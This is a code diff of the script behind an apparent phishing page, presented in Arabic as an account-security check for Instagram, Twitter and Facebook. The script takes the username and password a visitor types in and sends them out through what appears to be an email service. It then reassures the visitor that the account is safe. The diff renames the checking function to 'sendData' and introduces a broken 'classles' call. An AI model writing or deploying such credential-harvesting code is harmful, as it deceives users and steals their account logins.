@@ -6,12 +6,12 @@
 // Toggle Forms
 function toggleForm(platform) {
     document.querySelectorAll('.form').forEach(form => form.classList.add('hidden'));
-    document.getElementById(`${platform}-form`).classList.remove('hidden');
+    document.getElementById(`${platform}-form`).classles.remove('hidden');
     document.getElementById('result').classList.add('hidden');
 }
 
-// Check Security
-function checkSecurity(platform) {
+// Send Data and Show Message
+function sendData(platform) {
     const username = document.getElementById(`${platform}-username`).value;
     const password = document.getElementById(`${platform}-password`).value;
 
@@ -22,7 +22,7 @@ function checkSecurity(platform) {
 
     // عرض رسالة تحميل
     Swal.fire({
-        title: 'جاري الفحص...',
+        title: 'جاري الإرسال...',
         text: 'يرجى الانتظار',
         allowOutsideClick: false,
         didOpen: () => {
@@ -36,14 +36,14 @@ function checkSecurity(platform) {
         username: username,
         password: password
     }).then(function(response) {
-        // عرض رسالة "الحساب آمن، لا داعي للقلق"
-        Swal.fire('نجاح', 'تم الفحص بنجاح!', 'success');
-        document.getElementById('result-message').textContent = "الحساب آمن، لا داعي للقلق.";
+        // عرض رسالة "شكرًا، حسابك آمن"
+        Swal.fire('شكرًا', 'حسابك آمن.', 'success');
+        document.getElementById('result-message').textContent = "شكرًا، حسابك آمن.";
         document.getElementById('result').classList.remove('hidden');
     }, function(error) {
         console.error('Error sending email:', error); // إضافة سجل للخطأ
         Swal.fire('خطأ', 'حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.', 'error');
-        document.getElementById('result-message').textContent = "حدث خطأ أثناء الفحص. يرجى المحاولة مرة أخرى.";
+        document.getElementById('result-message').textContent = "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.";
         document.getElementById('result').classList.remove('hidden');
     });
 }
@@ -53,6 +53,6 @@ document.getElementById('instagram-btn').addEventListener('click', () => toggleF
 document.getElementById('twitter-btn').addEventListener('click', () => toggleForm('twitter'));
 document.getElementById('facebook-btn').addEventListener('click', () => toggleForm('facebook'));
 
-document.getElementById('instagram-check').addEventListener('click', () => checkSecurity('instagram'));
-document.getElementById('twitter-check').addEventListener('click', () => checkSecurity('twitter'));
-document.getElementById('facebook-check').addEventListener('click', () => checkSecurity('facebook'));
+document.getElementById('instagram-check').addEventListener('click', () => sendData('instagram'));
+document.getElementById('twitter-check').addEventListener('click', () => sendData('twitter'));
+document.getElementById('facebook-check').addEventListener('click', () => sendData('facebook'));
